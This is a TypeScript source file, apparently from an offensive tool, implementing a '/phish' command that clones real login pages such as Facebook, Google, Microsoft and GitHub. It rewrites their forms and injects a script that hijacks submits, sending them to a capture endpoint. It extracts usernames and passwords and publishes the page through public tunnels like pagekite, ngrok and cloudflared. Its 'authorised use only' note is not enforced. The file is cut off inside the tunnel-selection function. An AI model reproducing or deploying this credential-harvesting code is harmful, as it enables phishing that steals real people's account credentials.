/**
 * phish.ts — `/phish`: clone a login page, serve it, tunnel it, harvest credentials.
 *
 * What this module is: the engine behind the /phish command (ported from
 * andy/phish.py). It is an engine, not a playbook — a phishing page has to
 * stay up after the turn that launched it, and captured credentials have to
 * land in the UI in real time rather than in an end-of-run report. So this
 * module owns the whole life of a campaign: validate target → campaign dir
 * under `<stateDir>/phish/` → fetch (or template) → rewrite forms → serve
 * locally → public tunnel → JSONL log of every hit.
 *
 * Invariants: authorised use only (the command says so on every run; it cannot
 * check it — the operator is responsible for permission to clone the target
 * and collect what is submitted). No Ink/React imports — same split as
 * osint.ts and team.ts, so the engine is testable without a terminal.
 */

import { spawn, type ChildProcess } from 'node:child_process';
import * as fs from 'node:fs';
import * as http from 'node:http';
import { homedir } from 'node:os';
import * as net from 'node:net';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';
import { andyHome, expandTilde } from './shared.js';

// === SECTION === Target ===

// A hostname with at least one dot, optional scheme, optional path. Loose on
// purpose: the job is to catch an empty argument or an obvious typo, not to
// re-implement WHATWG. IPv4 is accepted so a lab box can be cloned too.
const HOST_RE =
  /^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
const IPV4_RE = /^\d{1,3}(?:\.\d{1,3}){3}$/;
const SLUG_RE = /[^a-zA-Z0-9._-]+/g;

// Form fields that look like a credential. Matched case-insensitively against
// the submitted name; the first hit of each kind is what the UI highlights.
const USER_KEYS = [
  'username', 'user', 'email', 'login', 'userid', 'user_id', 'account',
  'identifier', 'id', 'mail', 'phone', 'mobile',
];
const PASS_KEYS = [
  'password', 'passwd', 'pass', 'pwd', 'secret', 'pin', 'token',
  'passcode', 'passphrase',
];

// Browser-looking UA. A handful of login pages 403 a bare fetch UA and we
// would rather clone the real page than fall back to the template.
const UA =
  'Moandy/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ' +
  '(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';

// Extra headers a real Chrome navigation sends. Facebook (and a few other
// CDNs) 400 a request that only has UA/Accept — the Sec-Fetch-* set is what
// turns that into the live login HTML.
const FETCH_HEADERS: Record<string, string> = {
  'User-Agent': UA,
  Accept:
    'text/html,application/xhtml+xml,application/xml;q=0.9,' +
    'image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9',
  'Accept-Encoding': 'identity',
  'Upgrade-Insecure-Requests': '1',
  'Cache-Control': 'max-age=0',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'none',
  'Sec-Fetch-User': '?1',
};

// Bare host → the URL that actually serves that site's login form.
// `/phish www.facebook.com` must clone facebook.com/login, not the marketing
// homepage and not the generic branded card. A pasted path still wins.
const LOGIN_PATHS: Record<string, string> = {
  'facebook.com': 'https://www.facebook.com/login/',
  'www.facebook.com': 'https://www.facebook.com/login/',
  'm.facebook.com': 'https://www.facebook.com/login/',
  'mbasic.facebook.com': 'https://www.facebook.com/login/',
  'fb.com': 'https://www.facebook.com/login/',
  'instagram.com': 'https://www.instagram.com/accounts/login/',
  'www.instagram.com': 'https://www.instagram.com/accounts/login/',
  'github.com': 'https://github.com/login',
  'www.github.com': 'https://github.com/login',
  'linkedin.com': 'https://www.linkedin.com/login',
  'www.linkedin.com': 'https://www.linkedin.com/login',
  'x.com': 'https://x.com/i/flow/login',
  'www.x.com': 'https://x.com/i/flow/login',
  'twitter.com': 'https://x.com/i/flow/login',
  'www.twitter.com': 'https://x.com/i/flow/login',
  'accounts.google.com': 'https://accounts.google.com/ServiceLogin',
  'google.com': 'https://accounts.google.com/ServiceLogin',
  'www.google.com': 'https://accounts.google.com/ServiceLogin',
  'login.microsoftonline.com': 'https://login.microsoftonline.com/',
  'microsoft.com': 'https://login.microsoftonline.com/',
  'www.microsoft.com': 'https://login.microsoftonline.com/',
  'office.com': 'https://login.microsoftonline.com/',
  'www.office.com': 'https://login.microsoftonline.com/',
  'yahoo.com': 'https://login.yahoo.com/',
  'www.yahoo.com': 'https://login.yahoo.com/',
  'login.yahoo.com': 'https://login.yahoo.com/',
};

// Generic paths to try, in order, when the host is not in the table above
// and the operator did not paste a path themselves.
const GENERIC_LOGIN_PATHS = [
  '/login',
  '/login/',
  '/signin',
  '/sign-in',
  '/account/login',
  '/accounts/login',
  '/accounts/login/',
  '/user/login',
  '/users/sign_in',
  '/auth/login',
  '/session/new',
];

// How long we wait for a tunnel binary to print a public URL.
const TUNNEL_WAIT = 12.0;
// PageKite talks to pagekite.net before it prints a URL; give it longer.
const PAGEKITE_WAIT = 25.0;

// Vendored pagekite.py lives next to the other shipped artifacts. setup.sh
// copies it into ~/.andy/pagekite/ so a relocated install still finds it.
const HERE = path.dirname(fileURLToPath(import.meta.url));
const PAGEKITE_CANDIDATES = [
  path.join(andyHome(), 'pagekite', 'pagekite.py'),
  path.resolve(HERE, '..', 'packaging', 'pagekite', 'pagekite.py'),
];

/** Config surface this module needs (Config satisfies this structurally). */
export interface PhishConfig {
  stateDir: string;
}

function parseUrl(text: string): URL | null {
  try {
    return new URL(text);
  } catch {
    return null;
  }
}

/**
 * urlparse-style hostname fallback for hosts the WHATWG URL parser rejects.
 * `new URL("https://999.1.1.1")` throws ("host ends in a number" but is not
 * valid IPv4), while Python's urlparse keeps the hostname — and
 * `validateTarget` relies on that to say "not a valid IPv4 address" rather
 * than the useless "no target given". Input here always carries a scheme
 * (callers prepend https:// first).
 */
function looseHostname(text: string): string {
  const rest = text.replace(/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//, '');
  const netloc = rest.split(/[/?#]/)[0] ?? '';
  const at = netloc.lastIndexOf('@');
  const hostport = at === -1 ? netloc : netloc.slice(at + 1);
  return hostport.replace(/:\d*$/, '');
}

function stripDots(host: string): string {
  return host.replace(/^\.+|\.+$/g, '').toLowerCase();
}

export function normaliseTarget(raw: string): string {
  /** Reduce a typed target to `host` (no scheme, no path, no port).
   *
   * `/phish site.com`, `/phish https://site.com/login` and
   * `/phish www.site.com` all become the same host so the campaign
   * directory, the cloned Origin and the UI header cannot disagree. */
  let text = (raw || '').trim();
  if (!text) return '';
  if (!text.includes('://')) text = 'https://' + text;
  const parsed = parseUrl(text);
  return stripDots(parsed !== null ? parsed.hostname : looseHostname(text));
}

export function targetUrl(raw: string): string {
  /** The URL we actually fetch.
   *
   * A pasted path is kept (`site.com/login` clones that page, not the
   * homepage). A bare host is rewritten to that site's known login URL
   * so `/phish www.facebook.com` clones the Facebook login form, not
   * the marketing homepage. A missing scheme becomes https. */
  let text = (raw || '').trim();
  if (!text) return '';
  if (!text.includes('://')) text = 'https://' + text;
  const parsed = parseUrl(text);
  if (!parsed) {
    // WHATWG rejects e.g. `https://999.1.1.1`; urlparse does not. Keep the
    // typed authority+path (fragment dropped) so downstream validation can
    // produce its specific error instead of an empty candidate list.
    const host = looseHostname(text);
    if (!host) return '';
    return text.split('#')[0] ?? text;
  }
  if (!parsed.host) return '';
  const host = stripDots(parsed.hostname || '');
  const urlPath = parsed.pathname || '';
  // Only a host (or `/`) — pick the real login page for that brand.
  if (LOGIN_PATHS[host] && (urlPath === '' || urlPath === '/')) {
    return LOGIN_PATHS[host];
  }
  // Drop fragments; keep query — some login pages key off it.
  parsed.hash = '';
  const out = parsed.toString();
  // WHATWG `URL.toString()` renders an empty path as "/"; Python's
  // urlunsplit did not, and the pinned contract is the exact typed string.
  // When the input authority carried no "/" (bare host, optionally followed
  // by a query), strip the invented slash; an explicit "/" round-trips
  // unchanged. String surgery on the serialized URL keeps credentials,
  // non-default ports and the query byte-identical.
  if (parsed.pathname === '/') {
    const bare = (text.split('#')[0] ?? text).replace(/^[A-Za-z][A-Za-z0-9+.-]*:\/\//, '');
    if (/^[^/?#]+(\?|$)/.test(bare)) return out.replace(/\/(\?.*)?$/, '$1');
  }
  return out;
}

export function loginCandidates(raw: string): string[] {
  /** URLs to try, in order, until one actually looks like a login page.
   *
   * The first entry is always `targetUrl` so a pasted path still wins.
   * Extra well-known paths are appended so a bare `/phish shop.example`
   * still lands on `/login` rather than a homepage with no form. */
  const primary = targetUrl(raw);
  if (!primary) return [];
  const parsed = parseUrl(primary);
  // Degenerate host (WHATWG-rejected): the primary is all we can offer —
  // no origin math without a parseable URL.
  if (!parsed) return [primary];
  const host = stripDots(parsed.hostname || '');
  const urlPath = parsed.pathname || '/';
  const out: string[] = [primary];
  // A pasted path is authoritative — do not spray extra guesses.
  if (urlPath !== '' && urlPath !== '/') return out;
  const origin = `${parsed.protocol}//${parsed.host}`;
  for (const suffix of GENERIC_LOGIN_PATHS) {
    const guess = origin + suffix;
    if (!out.includes(guess)) out.push(guess);
  }
  // Last resort: the bare origin, in case the homepage IS the login.
  if (!out.includes(origin + '/') && !out.includes(origin)) {
    out.push(origin + '/');
  }
  // Known-host mapping already put the right URL first; keep the rest
  // as fallbacks in case that host moved.
  if (LOGIN_PATHS[host] && !out.includes(LOGIN_PATHS[host])) {
    out.unshift(LOGIN_PATHS[host]);
  }
  return out;
}

export function looksLikeLogin(htmlText: string): boolean {
  /** True when the page is the site's own sign-in, not a marketing homepage.
   *
   * Google / Microsoft / Yahoo paint the form in JS, so there is often no
   * `<form>` in the first HTML. A password field, a sign-in title, or a
   * known accounts host still counts — throwing those away is how
   * `/phish www.google.com` used to serve the generic card. */
  if (!htmlText) return false;
  const lowered = htmlText.toLowerCase();
  if (/type\s*=\s*["']password["']/.test(lowered)) return true;
  if (
    lowered.includes('<form') &&
    /(sign\s*in|log\s*in|password|passcode|email|username)/.test(lowered)
  ) {
    return true;
  }
  // JS-rendered sign-in shells (Google accounts, Microsoft, etc.).
  if (
    /(sign\s*in|log\s*in|accounts\.google|login\.microsoft|identifierid|passwordelement)/.test(
      lowered,
    ) &&
    (lowered.includes('<html') || lowered.includes('<!doctype'))
  ) {
    return true;
  }
  return false;
}

export function validateTarget(raw: string): [boolean, string] {
  /** Check a typed target. Returns `[ok, errorMessage]`. */
  const host = normaliseTarget(raw);
  if (!host) return [false, 'no target given'];
  if (IPV4_RE.test(host)) {
    const parts = host.split('.');
    if (parts.every((p) => /^\d+$/.test(p) && Number(p) >= 0 && Number(p) <= 255)) {
      return [true, ''];
    }
    return [false, `not a valid IPv4 address: ${host}`];
  }
  if (!HOST_RE.test(host)) return [false, `not a valid hostname: ${host}`];
  return [true, ''];
}

export function caseSlug(target: string): string {
  /** A filesystem-safe, recognisable label for a target. */
  const s = target.trim().replace(SLUG_RE, '-').replace(/^[.-]+|[.-]+$/g, '');
  return (s.slice(0, 64) || 'target').toLowerCase();
}

/** `YYYYmmdd-HHMMSS` in local time (matches Python time.strftime). */
function localStamp(): string {
  const d = new Date();
  const p = (n: number) => String(n).padStart(2, '0');
  return (
    `${d.getFullYear()}${p(d.getMonth() + 1)}${p(d.getDate())}` +
    `-${p(d.getHours())}${p(d.getMinutes())}${p(d.getSeconds())}`
  );
}

export function campaignDir(cfg: PhishConfig, target: string): string {
  /** Create and return this run's campaign directory.
   *
   * `<stateDir>/phish/<slug>-<timestamp>/` — under stateDir so campaign
   * files land beside sessions rather than in whatever repo the operator
   * happens to be in. Created eagerly so the server can write into it from
   * its first request. */
  const stamp = localStamp();
  const label = caseSlug(normaliseTarget(target) || target);
  const d = path.join(cfg.stateDir, 'phish', `${label}-${stamp}`);
  fs.mkdirSync(d, { recursive: true });
  return d;
}

// === SECTION === Page clone / rewrite ===

function escapeHtmlAttr(s: string): string {
  // Python html.escape(s, quote=True): & < > " ' — the minimum for a
  // double-quoted attribute context.
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function injectBase(htmlText: string, origin: string): string {
  /** Make relative URLs resolve against the cloned origin.
   *
   * Without this, `/static/app.css` on the phishing host 404s and the page
   * looks broken. A `<base href>` is the smallest change that keeps the
   * clone looking like the original. */
  const o = origin.replace(/\/+$/, '') + '/';
  const tag = `<base href="${escapeHtmlAttr(o)}">`;
  if (/<base\s/i.test(htmlText)) {
    return htmlText.replace(/<base\s[^>]*>/i, () => tag);
  }
  if (/<head[^>]*>/i.test(htmlText)) {
    return htmlText.replace(/(<head[^>]*>)/i, (_m, head: string) => `${head}\n${tag}`);
  }
  return tag + '\n' + htmlText;
}

// The `/__andy_*` endpoint names and the `andyHooked` dataset key are this
// module's own self-contained wire identifiers (page → our server); they are
// kept verbatim from the Python original — nothing else knows or parses them,
// and the rename rules cover only andy/Andy/ANDY.
const CAPTURE_HOOK = `
<script>
(function () {
  function send(fd) {
    try {
      fetch("/__andy_capture", {method: "POST", body: fd, credentials: "same-origin"});
    } catch (e) {}
  }
  function hijack(form) {
    if (!form || form.dataset.andyHooked) return;
    form.dataset.andyHooked = "1";
    form.setAttribute("action", "/__andy_capture");
    form.setAttribute("method", "POST");
    form.removeAttribute("target");
    form.addEventListener("submit", function (ev) {
      ev.preventDefault();
      ev.stopPropagation();
      try { send(new FormData(form)); } catch (e) {}
      window.location = "/__andy_thanks";
      return false;
    }, true);
  }
  function scan(root) {
    (root.querySelectorAll ? root.querySelectorAll("form") : []).forEach(hijack);
  }
  scan(document);
  document.addEventListener("submit", function (ev) {
    var form = ev.target;
    if (!form || !form.tagName || form.tagName.toLowerCase() !== "form") return;
    ev.preventDefault();
    ev.stopPropagation();
    hijack(form);
    try { send(new FormData(form)); } catch (e) {}
    window.location = "/__andy_thanks";
    return false;
  }, true);
  if (window.MutationObserver) {
    new MutationObserver(function (muts) {
      muts.forEach(function (m) {
        m.addedNodes.forEach(function (n) {
          if (n && n.nodeType === 1) {
            if (n.tagName && n.tagName.toLowerCase() === "form") hijack(n);
            scan(n);
          }
        });
      });
    }).observe(document.documentElement, {childList: true, subtree: true});
  }
})();
</script>
`;

function injectCaptureHook(htmlText: string): string {
  /** Catch forms the live page builds in JS after paint.
   *
   * Google / Microsoft / a lot of modern logins have no `<form>` in the
   * first HTML. Rewriting static tags is not enough — we have to hook
   * submit (and any form that appears later) so the clone still harvests. */
  if (htmlText.includes('andyHooked')) return htmlText;
  if (/<\/body\s*>/i.test(htmlText)) {
    return htmlText.replace(/<\/body\s*>/i, () => CAPTURE_HOOK + '</body>');
  }
  return htmlText + CAPTURE_HOOK;
}

function rewriteForms(htmlText: string): string {
  /** Point every form at our capture endpoint and force POST.
   *
   * The cloned page's own `action` would submit to the real site; that is
   * the opposite of what this command is for. We also drop
   * `onsubmit`/`target` so client-side validation or a new-tab submit
   * cannot skip the capture. */
  return htmlText.replace(/<form\b[^>]*>/gi, (tag) => {
    let t = tag;
    t = t.replace(/\saction\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
    t = t.replace(/\smethod\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
    t = t.replace(/\starget\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
    t = t.replace(/\sonsubmit\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
    // Insert just before the closing `>`.
    return t.slice(0, -1) + ' action="/__andy_capture" method="POST">';
  });
}

function brandedTemplate(host: string): string {
  /** A clean login page used when the live fetch fails.
   *
   * Looks enough like a branded portal that a lab victim will type into it;
   * it is not a pixel-perfect clone and does not pretend to be. */
  const safe = escapeHtmlAttr(host);
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in · ${safe}</title>
<style>
  :root { color-scheme: light; }
  * { box-sizing: border-box; }
  body {
    margin: 0; min-height: 100vh; display: grid; place-items: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: #0b1220; color: #0b1220;
  }
  .card {
    width: min(420px, 92vw); background: #fff; border-radius: 12px;
    padding: 36px 32px 28px; box-shadow: 0 24px 60px rgba(0,0,0,.35);
  }
  .mark {
    width: 40px; height: 40px; border-radius: 10px;
    background: #111827; color: #fff; display: grid; place-items: center;
    font-weight: 700; letter-spacing: .04em; margin-bottom: 18px;
  }
  h1 { font-size: 22px; margin: 0 0 6px; }
  p.sub { margin: 0 0 22px; color: #6b7280; font-size: 14px; }
  label { display: block; font-size: 13px; font-weight: 600; margin: 12px 0 6px; }
  input {
    width: 100%; padding: 11px 12px; border: 1px solid #d1d5db;
    border-radius: 8px; font-size: 15px;
  }
  input:focus { outline: 2px solid #111827; outline-offset: 1px; }
  button {
    width: 100%; margin-top: 20px; padding: 12px;
    background: #111827; color: #fff; border: 0; border-radius: 8px;
    font-size: 15px; font-weight: 600; cursor: pointer;
  }
  .fine { margin-top: 16px; font-size: 12px; color: #9ca3af; text-align: center; }
</style>
</head>
<body>
  <form class="card" action="/__andy_capture" method="POST">
    <div class="mark">${safe.slice(0, 1).toUpperCase()}</div>
    <h1>Sign in to ${safe}</h1>
    <p class="sub">Use your ${safe} account to continue.</p>
    <label for="email">Email or username</label>
    <input id="email" name="email" type="text" autocomplete="username" required>
    <label for="password">Password</label>
    <input id="password" name="password" type="password" autocomplete="current-password" required>
    <button type="submit">Continue</button>
    <p class="fine">Protected connection · ${safe}</p>
  </form>
</body>
</html>
`;
}

function thanksPage(host: string): string {
  const safe = escapeHtmlAttr(host);
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Signed in · ${safe}</title>
<style>
  body {
    margin: 0; min-height: 100vh; display: grid; place-items: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: #0b1220; color: #e5e7eb;
  }
  .box { text-align: center; }
  h1 { font-size: 22px; margin: 0 0 8px; }
  p { color: #9ca3af; }
</style>
</head>
<body>
  <div class="box">
    <h1>Checking your details…</h1>
    <p>You will be redirected shortly.</p>
  </div>
</body>
</html>
`;
}

// Python bytes.lstrip() strips these ASCII whitespace bytes before the
// doctype/html sniff in fetchPage.
const WS_BYTES = new Set([0x20, 0x09, 0x0a, 0x0d, 0x0b, 0x0c]);

function sniffHead(raw: Uint8Array, n: number): string {
  let i = 0;
  while (i < raw.length && WS_BYTES.has(raw[i])) i++;
  return new TextDecoder('latin1').decode(raw.subarray(i, i + n));
}

export async function fetchPage(
  url: string,
  timeout = 12.0,
): Promise<[string | null, string]> {
  /** GET *url*. Returns `[htmlOrNull, note]`.
   *
   * A failure is not fatal — the caller falls back to the branded template
   * and the note is what the UI shows as the clone status. */
  try {
    const resp = await fetch(url, {
      headers: FETCH_HEADERS,
      redirect: 'follow',
      signal: AbortSignal.timeout(timeout * 1000),
    });
    if (!resp.ok) return [null, `http ${resp.status}`];
    const raw = new Uint8Array(await resp.arrayBuffer());
    const ctype = (resp.headers.get('content-type') ?? '').toLowerCase();
    const head = sniffHead(raw, 32).toLowerCase();
    if (!ctype.includes('html') && !head.startsWith('<!doctype') && !head.startsWith('<html')) {
      return [null, `not html (${ctype || 'unknown type'})`];
    }
    let charset = 'utf-8';
    const m = ctype.match(/charset=([^;]+)/);
    if (m) charset = (m[1] ?? '').trim() || 'utf-8';
    let text: string;
    try {
      text = new TextDecoder(charset).decode(raw);
    } catch {
      // Unknown charset label (Python LookupError) — decode as best we can.
      text = new TextDecoder('utf-8').decode(raw);
    }
    return [text, `cloned ${resp.url} (${raw.length} bytes)`];
  } catch (e) {
    const err = e as Error;
    const reason = err.name === 'TimeoutError' ? 'timed out' : (err.message ?? String(e));
    return [null, `fetch failed: ${reason}`];
  }
}

export async function cloneLogin(
  raw: string,
  timeout = 12.0,
): Promise<[string | null, string, string]> {
  /** Walk login candidates until one looks like the real sign-in page.
   *
   * Returns `[htmlOrNull, note, urlUsed]`. Prefer a page that looks
   * like a login. If none do, still return the best live HTML we got —
   * serving the site's own page (even a JS shell) looks like the target;
   * the generic card does not. The template is only for a total fetch miss. */
  const tried: string[] = [];
  let lastNote = 'no candidates';
  let lastUrl = targetUrl(raw);
  let fallbackHtml: string | null = null;
  let fallbackNote = lastNote;
  let fallbackUrl = lastUrl;
  for (const url of loginCandidates(raw)) {
    const [htmlText, note] = await fetchPage(url, timeout);
    lastNote = note;
    lastUrl = url;
    if (!htmlText) {
      tried.push(`${url} (${note})`);
      continue;
    }
    if (looksLikeLogin(htmlText)) {
      return [htmlText, note, url];
    }
    if (fallbackHtml === null || htmlText.length > fallbackHtml.length) {
      fallbackHtml = htmlText;
      fallbackNote = note + ' (best live page; no static form)';
      fallbackUrl = url;
    }
    tried.push(`${url} (no login form)`);
  }
  if (fallbackHtml) {
    return [fallbackHtml, fallbackNote, fallbackUrl];
  }
  if (tried.length) {
    lastNote = 'no login form on: ' + tried.slice(0, 4).join('; ');
  }
  return [null, lastNote, lastUrl];
}

export function buildPage(
  host: string,
  url: string,
  fetched: string | null,
): [string, boolean] {
  /** Return `[html, cloned]` ready to serve.
   *
   * *cloned* is true only when the live page was used. The template is always
   * a last resort, never a silent substitute the operator cannot see. */
  if (fetched) {
    const u = parseUrl(url);
    const origin = u ? `${u.protocol}//${u.host}` : '';
    let page = injectBase(fetched, origin);
    page = rewriteForms(page);
    page = injectCaptureHook(page);
    return [page, true];
  }
  return [brandedTemplate(host), false];
}

export function pickCredentials(fields: Record<string, string>): [string, string] {
  /** Best-effort (user, password) from a submitted field map. */
  let user = '';
  let password = '';
  const lowered: Record<string, string> = {};
  for (const [k, v] of Object.entries(fields)) lowered[k.toLowerCase()] = v;
  for (const key of USER_KEYS) {
    if (lowered[key]) {
      user = lowered[key];
      break;
    }
  }
  for (const key of PASS_KEYS) {
    if (lowered[key]) {
      password = lowered[key];
      break;
    }
  }
  if (!user) {
    // First non-password field, so a weird name still shows something.
    for (const [k, v] of Object.entries(fields)) {
      if (!PASS_KEYS.includes(k.toLowerCase()) && v) {
        user = v;
        break;
      }
    }
  }
  return [user, password];
}

// === SECTION === Tunnel ===

export class Tunnel {
  /** A public URL in front of the local server, or a failed attempt. */
  url = '';
  tool = '';
  error = '';
  proc: ChildProcess | null = null;

  constructor(init?: Partial<Pick<Tunnel, 'url' | 'tool' | 'error' | 'proc'>>) {
    if (init) Object.assign(this, init);
  }

  get ok(): boolean {
    return Boolean(this.url);
  }

  stop(): void {
    if (this.proc === null) return;
    const proc = this.proc;
    let exited = false;
    proc.once('exit', () => {
      exited = true;
    });
    try {
      proc.kill('SIGTERM');
    } catch {
      /* already gone */
    }
    // Python: terminate, wait(3), then kill. Mirror the 3s grace before
    // escalating; the timer is unref'd so it never holds the process open.
    const escalator = setTimeout(() => {
      if (!exited) {
        try {
          proc.kill('SIGKILL');
        } catch {
          /* already gone */
        }
      }
    }, 3000);
    escalator.unref?.();
    this.proc = null;
  }
}

function isFile(p: string): boolean {
  try {
    return fs.statSync(p).isFile();
  } catch {
    return false;
  }
}

function which(name: string): string | null {
  const dirs = (process.env.PATH ?? '').split(path.delimiter).filter(Boolean);
  for (const dir of dirs) {
    const cand = path.join(dir, name);
    if (!isFile(cand)) continue;
    try {
      fs.accessSync(cand, fs.constants.X_OK);
      return cand;
    } catch {
      /* not executable — keep scanning */
    }
  }
  return null;
}

/** Read a child's combined output until *pattern* matches or we time out.
 *
 * The child is started with both stdout and stderr piped and both drained
 * into one buffer (Python merged them into a single PIPE). Returns whatever
 * was read (matched or not). Resolves on match, timeout, or child exit —
 * a silent binary cannot hang the UI. */
function readUntil(
  proc: ChildProcess,
  pattern: RegExp,
  timeoutSecs: number,
): Promise<string> {
  return new Promise((resolve) => {
    let blob = '';
    let settled = false;
    const finish = () => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      resolve(blob);
    };
    const timer = setTimeout(finish, timeoutSecs * 1000);
    const onChunk = (d: Buffer | string) => {
      blob += typeof d === 'string' ? d : d.toString('utf8');
      if (pattern.test(blob)) finish();
    };
    proc.stdout?.on('data', onChunk);
    proc.stderr?.on('data', onChunk);
    proc.on('error', (err: Error) => {
      blob += `\n${err.message}`;
      finish();
    });
    proc.on('close', () => {
      // Streams are flushed; give a beat for pending data then stop.
      setTimeout(finish, 50);
    });
  });
}

export function pagekiteBin(): string | null {
  /** The pagekite.py we will actually run, or null if it is not installed. */
  const override = process.env.PAGEKITE_BIN;
  if (override) {
    const p = expandTilde(override);
    if (isFile(p)) return p;
  }
  for (const cand of PAGEKITE_CANDIDATES) {
    if (isFile(cand)) return cand;
  }
  return which('pagekite.py') ?? which('pagekite');
}

export function pagekiteName(): string {
  /** Public kite name, e.g. `andy.pagekite.me`.
   *
   * Looked up in order: `PAGEKITE_NAME`, then `~/.andy/pagekite.name`.
   * Empty means PageKite cannot fly unattended — `openTunnel` will skip it
   * rather than hang on signup. */
  const env = (process.env.PAGEKITE_NAME ?? '').trim();
  if (env) return env;
  const file = path.join(andyHome(), 'pagekite.name');
  try {
    return (fs.readFileSync(file, 'utf8').trim().split('\n')[0] ?? '').trim();
  } catch {
    return '';
  }
}

async function openPagekite(port: number): Promise<Tunnel> {
  /** Fly the local campaign through pagekite.net.
   *
   * This is the worldwide forwarder: every phishing link is meant to ship
   * from here. Needs a kite name (`PAGEKITE_NAME` or `~/.andy/pagekite.name`)
   * and a prior `pagekite.py --signup` so the secret is already in
   * `~/.pagekite.rc`. `--nullui` keeps it from blocking the TUI on a prompt. */
  const binPath = pagekiteBin();
  if (binPath === null) return new Tunnel({ error: 'pagekite.py not installed' });
  let name = pagekiteName();
  if (!name) {
    return new Tunnel({
      error:
        'pagekite: set PAGEKITE_NAME or ~/.andy/pagekite.name ' +
        '(then: pagekite.py --signup)',
    });
  }
  if (!name.includes('.')) name = name + '.pagekite.me';
  const url = name.includes('://') ? name : 'https://' + name;
  const host = parseUrl(url)?.hostname ?? name;
  let proc: ChildProcess;
  try {
    proc = spawn(
      binPath,
      [
        '--clean',
        '--nullui',
        '--defaults',
        '--optfile',
        path.join(homedir(), '.pagekite.rc'),
        `localhost:${port}`,
        host,
      ],
      { stdio: ['ignore', 'pipe', 'pipe'] },
    );
  } catch (e) {
    return new Tunnel({ error: `pagekite failed to start: ${e instanceof Error ? e.message : e}` });
  }
  const blob = await readUntil(proc, /https?:\/\/[a-zA-Z0-9._-]+\.pagekite\.me/, PAGEKITE_WAIT);
  const m = blob.match(/(https?:\/\/[a-zA-Z0-9._-]+\.pagekite\.me)/);
  if (m) {
    let public_ = m[1];
    if (public_.startsWith('http://')) public_ = 'https://' + public_.slice('http://'.length);
    return new Tunnel({ url: public_, tool: 'pagekite', proc });
  }
  // pagekite often prints the kite name without a scheme once it is flying.
  const stillRunning = proc.exitCode === null && proc.signalCode === null;
  if (new RegExp(host.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i').test(blob) && stillRunning) {
    return new Tunnel({ url: 'https://' + host, tool: 'pagekite', proc });
  }
  proc.kill('SIGKILL');
  const trimmed = blob.trim();
  const tail = trimmed ? trimmed.split('\n').slice(-2).join(' ').slice(0, 180) : 'no output';
  return new Tunnel({ error: `pagekite started but printed no URL (${tail})` });
}

async function openCloudflared(port: number): Promise<Tunnel> {
  const binPath = which('cloudflared');
  if (!binPath) return new Tunnel({ error: 'cloudflared not installed' });
  let proc: ChildProcess;
  try {
    proc = spawn(
      binPath,
      ['tunnel', '--url', `http://127.0.0.1:${port}`, '--no-autoupdate'],
      { stdio: ['ignore', 'pipe', 'pipe'] },
    );
  } catch (e) {
    return new Tunnel({ error: `cloudflared failed to start: ${e instanceof Error ? e.message : e}` });
  }
  const blob = await readUntil(proc, /https:\/\/[a-z0-9-]+\.trycloudflare\.com/, TUNNEL_WAIT);
  const m = blob.match(/(https:\/\/[a-z0-9-]+\.trycloudflare\.com)/);
  if (m) return new Tunnel({ url: m[1], tool: 'cloudflared', proc });
  proc.kill('SIGKILL');
  return new Tunnel({ error: 'cloudflared started but printed no URL' });
}

async function openNgrok(port: number): Promise<Tunnel> {
  const binPath = which('ngrok');
  if (!binPath) return new Tunnel({ error: 'ngrok not installed' });
  let proc: ChildProcess;
  try {
    proc = spawn(
      binPath,
      ['http', String(port), '--log', 'stdout', '--log-format', 'json'],
      { stdio: ['ignore', 'pipe', 'pipe'] },
    );
  } catch (e) {
    return new Tunnel({ error: `ngrok failed to start: ${e instanceof Error ? e.message : e}` });
  }
  const blob = await readUntil(proc, /https:\/\/[a-z0-9-]+\.ngrok(?:-free)?\.(?:app|io)/, TUNNEL_WAIT);
  const m = blob.match(/(https:\/\/[a-z0-9-]+\.ngrok(?:-free)?\.(?:app|io))/);
  if (m) return new Tunnel({ url: m[1], tool: 'ngrok', proc });
  // ngrok's JSON log uses url=; fall back to that.
  const j = blob.match(/"url"\s*:\s*"(https:\/\/[^"]+)"/);
  if (j && j[1].includes('ngrok')) {
    return new Tunnel({ url: j[1], tool: 'ngrok', proc });
  }
  proc.kill('SIGKILL');
  return new Tunnel({ error: 'ngrok started but printed no URL' });
}

async function openLocaltunnel(port: number): Promise<Tunnel> {
  const binPath = which('lt');
  if (!binPath) return new Tunnel({ error: 'localtunnel (lt) not installed' });
  let proc: ChildProcess;
  try {
    proc = spawn(binPath, ['--port', String(port)], { stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (e) {
    return new Tunnel({ error: `localtunnel failed to start: ${e instanceof Error ? e.message : e}` });
  }
  const blob = await readUntil(proc, /https:\/\/[a-z0-9-]+\.loca\.lt/, TUNNEL_WAIT);
  const m = blob.match(/(https:\/\/[a-z0-9-]+\.loca\.lt)/);
  if (m) return new Tunnel({ url: m[1], tool: 'localtunnel', proc });
  proc.kill('SIGKILL');
  return new Tunnel({ error: 'localtunnel started but printed no URL' });
}

export async function openTunnel(port: number): Promise<Tunnel> {
  /** Try pagekite first, then cloudflared / ngrok / localtunnel.
   *
